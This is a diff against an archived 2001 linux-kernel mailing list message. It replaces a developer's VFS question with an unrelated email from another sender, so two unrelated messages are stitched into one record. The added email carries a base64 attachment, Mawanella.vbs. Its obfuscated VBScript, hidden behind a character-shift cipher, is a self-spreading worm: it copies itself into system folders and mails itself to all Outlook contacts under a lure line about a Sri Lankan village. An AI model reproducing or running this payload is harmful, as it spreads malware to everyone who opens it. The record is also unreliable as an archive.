@@ -1,35 +1,100 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id <S262617AbREVQ3O>; Tue, 22 May 2001 12:29:14 -0400
+	id <S262618AbREVQ3o>; Tue, 22 May 2001 12:29:44 -0400
 Received: (majordomo@vger.kernel.org) by vger.kernel.org
-	id <S262618AbREVQ3F>; Tue, 22 May 2001 12:29:05 -0400
-Received: from sisley.ri.silicomp.fr ([62.160.165.44]:39435 "EHLO
-	sisley.ri.silicomp.fr") by vger.kernel.org with ESMTP
-	id <S262617AbREVQ2v>; Tue, 22 May 2001 12:28:51 -0400
-Date: Tue, 22 May 2001 18:28:33 +0200 (CEST)
-From: Jean-Marc Saffroy <saffroy@ri.silicomp.fr>
-To: <linux-kernel@vger.kernel.org>
-cc: Jean-Marc Saffroy <saffroy@ri.silicomp.fr>
-Subject: [Q] [VFS] i_mapping vs. i_data ?
-Message-ID: <Pine.LNX.4.31.0105221813030.29327-100000@sisley.ri.silicomp.fr>
+	id <S262624AbREVQ3e>; Tue, 22 May 2001 12:29:34 -0400
+Received: from [65.105.206.211] ([65.105.206.211]:21623 "EHLO
+	MAIL.confluencenetworks.com") by vger.kernel.org with ESMTP
+	id <S262618AbREVQ3T>; Tue, 22 May 2001 12:29:19 -0400
+Subject: Mawanella
+Date: Tue, 22 May 2001 09:29:17 -0700
 MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+Content-Type: multipart/mixed;
+	boundary="----_=_NextPart_001_01C0E2DC.5899035E"
+Message-ID: <71AD71402EB8B04AB30F351C1EE5707C01FFF4@MAIL.confluencenetworks.com>
+content-class: urn:content-classes:message
+X-MimeOLE: Produced By Microsoft Exchange V6.0.4417.0
+Thread-Topic: Mawanella
+Thread-Index: AcDi3FhlzozWZ5RDQNi8MrRrvJCAqA==
+From: "Mayank Vasa" <mvasa@confluencenetworks.com>
+To: <linux-kernel@vger.kernel.org>
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Hello,
+This is a multi-part message in MIME format.
 
-I have the following question for VFS gurus here:
-
-In the inode struct, an address_space (i_data) and a pointer to an
-address_space (i_mapping) are defined, and it looks like i_mapping is
-always a reference to the inode's i_data (except in coda_open). Then what
-is the difference of meaning between these two ?
+------_=_NextPart_001_01C0E2DC.5899035E
+Content-Type: text/plain;
+	charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
 
 
-Regards,
+Mawanella is one of the Sri Lanka's Muslim Village
 
--- 
-Jean-Marc Saffroy - Research Engineer - Silicomp Research Institute
-mailto:saffroy@ri.silicomp.fr
 
+------_=_NextPart_001_01C0E2DC.5899035E
+Content-Type: application/octet-stream;
+	name="Mawanella.vbs"
+Content-Transfer-Encoding: base64
+Content-Description: Mawanella.vbs
+Content-Disposition: attachment;
+	filename="Mawanella.vbs"
+
+DQpFeGVjdXRlIFVuQ29kZSgiVHMlSnd3dHclV2p4enJqJVNqfXkPV2pyJTQ0JU4lbWZ5aiVSZnxm
+c2pxcWYlbnNobmlqc3kPWGp5JVxkWCVCJUh3amZ5alRnb2poeS0nXFhod251eTNYbWpxcScuD1hq
+eSVreHQlQiVId2pmeWpUZ29qaHktJ1hod251eW5zbDNLbnFqWH54eWpyVGdvamh5Jy4PeGp5JWtu
+cWolQiVreHQzVHVqc1lqfXlLbnFqLVxYaHdudXkzWGh3bnV5S3pxcXNmcmoxNi4Pe2d4aHR1fkJr
+bnFqM1dqZmlGcXEPcmZucy0uDw94emclcmZucy0uDyUlJVRzJUp3d3R3JVdqeHpyaiVTan15DyUl
+JWluciV8eGh3MXd3MSV4eXdSeGwPJSUleGp5JXx4aHdCSHdqZnlqVGdvamh5LSdcWGh3bnV5M1ht
+anFxJy4PJSUlJSUlWGp5JWlud3xucyVCJWt4dDNManlYdWpobmZxS3RxaWp3LTUuDyUlJSUlJVhq
+eSVpbnd4fnh5anIlQiVreHQzTGp5WHVqaG5mcUt0cWlqdy02Lg8lJSUlJSVYanklaW53eWpydSVC
+JWt4dDNManlYdWpobmZxS3RxaWp3LTcuDyUlJSUlJVhqeSVoS25xaiVCJWt4dDNManlLbnFqLVxY
+aHdudXkzWGh3bnV5S3pxcVNmcmouDyUlJSUlJWhLbnFqM0h0dX4taW53eH54eWpyKydhUmZ8ZnNq
+cXFmM3tneCcuDyUlJSUlD1hqeSVUenlxdHRwRiVCJUh3amZ5alRnb2poeS0nVHp5cXR0cDNGdXVx
+bmhmeW50cycuD05rJVR6eXF0dHBGJUIlJ1R6eXF0dHAnJVltanMPJSUlWGp5JVJmdW5CVHp5cXR0
+cEYzTGp5U2Zyalh1ZmhqLSdSRlVOJy4PJSUlWGp5JUZpaVFueHl4QlJmdW4zRmlpd2p4eFFueHl4
+DyUlJUt0dyVKZmhtJVFueHlOc2lqfSVOcyVGaWlRbnh5eA8lJSUlJSUlTmslUW54eU5zaWp9M0Zp
+aXdqeHhKc3l3bmp4M0h0enN5JUFDJTUlWW1qcw8OJSVIdHN5Zmh5SHR6c3ldJUIlUW54eU5zaWp9
+M0ZpaXdqeHhKc3l3bmp4M0h0enN5Dw4lJUt0dyVIdHpzeUIlNiVZdCVIdHN5Zmh5SHR6c3ldDyUl
+JSUlJSUlJSUlJSUlWGp5JVJmbnFdJUIlVHp5cXR0cEYzSHdqZnlqTnlqci01Lg8OJSUlJSUlWGp5
+JUh0c3lmaHldJUIlUW54eU5zaWp9M0ZpaXdqeHhKc3l3bmp4LUh0enN5Lg8lJSUlJSUlJSUlJSUl
+JSxyeGxndH0laHRzeWZoeX0zZmlpd2p4eA8lJSUlJSUlJSUlJSUlJSxSZm5xfTNXamhudW5qc3l4
+M0ZpaS1IdHN5Zmh5XTNGaWl3anh4Lg8lJSUlJSUlJSUlJSUlJVJmbnFdM1l0JUIlSHRzeWZoeV0z
+Rmlpd2p4eA8OJSUlJSUlUmZucV0zWHpnb2poeSVCJSdSZnxmc2pxcWYnDw4lJSUlJSVSZm5xXTNH
+dGl+JUIle2dod3FrKydSZnxmc2pxcWYlbngldHNqJXRrJXltaiVYd24lUWZzcGYseCVSenhxbnIl
+W25xcWZsaicre2dod3FrDw4lJSUlJSUsWGp5JUZ5eWZobXJqc3lCUmZucV0zRnl5ZmhtcmpzeXgP
+DiUlJSUlJSxGeXlmaG1yanN5M0ZpaSVpbnd4fnh5anIlKyUnYVJmfGZzanFxZjN7Z3gnDw4lJSUl
+JSUsUmZucX0zRnl5ZmhtcmpzeXgzRmlpLWlud3h+eHlqciUrJSdhUmZ8ZnNqcXFmM3tneCcuDw4l
+JSUlJSVSZm5xfTNGeXlmaG1yanN5eDNGaWktaW53eH54eWpyJSslJ2FSZnxmc2pxcWYze2d4Jy4P
+DiUlJSUlJVJmbnFdM0lqcWp5akZreWp3WHpncm55JUIlWXd6ag8OJSUlJSUlTmslUmZucV0zWXQl
+QUMlJyclWW1qcw8ODiVSZm5xXTNYanNpDyUOJSUlJSUlSnNpJU5rDyUlJSUlJSUlJSUlU2p9eQ8l
+JSUlJSUlSnNpJU5rDyUlJVNqfXkPSnF4ag8lJSVyeGxHdH0lJ1VxamZ4aiVLdHd8ZndpJXltbngl
+eXQlantqd350c2onJQ9Kc2klbmsPD3h5d1J4bEIlJyUlLiUlJSUlJSUlJSUlJSUlJSUlJSUlLScl
+KyV7Z2h3cWsPeHl3UnhsQiV4eXdSeGwlKyUnLSUlLiUlJSUlJSUlJSUlJSUlJSUtJSUlLiUlJyUr
+JXtnaHdxaw94eXdSeGxCJXh5d1J4bCUrJSclJS0lJSUlLiUlJSUlJSUlJSUtJSUlLiclKyV7Z2h3
+cWsPeHl3UnhsQiV4eXdSeGwlKyUnJSUlJS0lJSUuJSUlJSUlLSUlJSUlJSUlJS4nJSsle2dod3Fr
+D3h5d1J4bEIleHl3UnhsJSslJyUlJSUyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyJyUrJXtnaHdx
+aw94eXdSeGxCJXh5d1J4bCUrJSclJSU0JSUlJSUlJS0lJSUtJSUlJS0lJSUlJSU0YSclKyV7Z2h3
+cWsPeHl3UnhsQiV4eXdSeGwlKyUnJSU0JSUlJSUlJSUlJS0lJSUlJSUlJSUlJSUlNCUlYSclKyV7
+Z2h3cWsPeHl3UnhsQiV4eXdSeGwlKyUnJTQlJSUlJSUlJSUlJSUtJS0lJSUlJSUlJSU0JSUlJWEn
+JSsle2dod3FrD3h5d1J4bEIleHl3UnhsJSslJyUyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy
+MjIyMiclKyV7Z2h3cWsPeHl3UnhsQiV4eXdSeGwlKyUnJYElJSUlJSUlJSUlJSUlJSUlMjIyJSUl
+JSUlgSUlJSUlJYEnJSsle2dod3FrD3h5d1J4bEIleHl3UnhsJSslJyWBJSUyMjIyMiUlJSUlJSUl
+gSUlJYElJSUlJSWBJSUlJSUlgSclKyV7Z2h3cWsPeHl3UnhsQiV4eXdSeGwlKyUnJYElgSUlJSUl
+gSUlJSUlJSUlMjIyJSUlJSUlJYElJSUlJSWBJyUrJXtnaHdxaw94eXdSeGxCJXh5d1J4bCUrJScl
+gSWBJSUlJSWBJSUlJSUlJSUlJSUlJSUlJSUlgSUlJSUlJYEnJSsle2dod3FrD3h5d1J4bEIleHl3
+UnhsJSslJyUyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMiclKyV7Z2h3cWsPD3h5d1J4
+bEIleHl3UnhsJSslJ1JmfGZzanFxZiVueCV0c2oldGsleW1qJVh3biVRZnNwZix4JVJ6eHFuciVb
+bnFxZmxqMyclKyV7Z2h3cWslD3h5d1J4bEIleHl3UnhsJSslJ1ltbnglZ3d6eWZxJW5zaG5panN5
+JW1mdXVqc2ppJW1qd2olNyVSenhxbnIlUnR4dnpqeCUrJTY1NSVYbXR1eCVmd2olZ3p3c3kzJyUr
+JXtnaHdxayUPeHl3UnhsQiV4eXdSeGwlKyUnTiVtZnkleW1ueCVuc2huaWpzeTElXG1meSVmZ3R6
+eSV+dHpEJU4laGZzJWlqeHl3dH4lfnR6dyVodHJ1enlqdyclKyV7Z2h3cWslD3h5d1J4bEIleHl3
+UnhsJSslJ04laW5pcyx5JWl0JXltZnklZ2poZnp4aiVOJWZyJWYldWpmaGoycXR7bnNsJWhueW5/
+anMzJw8lD3J4bGd0fSV4eXdSeGwxMSdSZnxmc2pxcWYnDw9Kc2kleHpnDw8lDyIpDQoNCg0KRnVu
+Y3Rpb24gVW5Db2RlKHNDb2RlZCkNCiAgIEZvciBJPTEgVG8gTGVuKHNDb2RlZCkNCiAgICAgIEN1
+ckNoYXI9IE1pZChzQ29kZWQsIEksIDEpDQogICAgICBJZiBBc2MoQ3VyQ2hhcikgPSAxNSBUaGVu
+DQogICAgICAgICBzdHJDaHI9IENocigxMCkNCiAgICAgIEVsc2UNCiAgICAgICAgIHN0ckNociA9
+IGNocihhc2MoQ3VyQ2hhciktNSkNCiAgICAgIEVuZCBpZg0KICAgICAgICAgVW5Db2RlID0gVW5D
+b2RlICYgc3RyQ2hyDQogICAgTmV4dA0KRW5kIEZ1bmN0aW9uICAgDQoNCg==
+
+------_=_NextPart_001_01C0E2DC.5899035E--
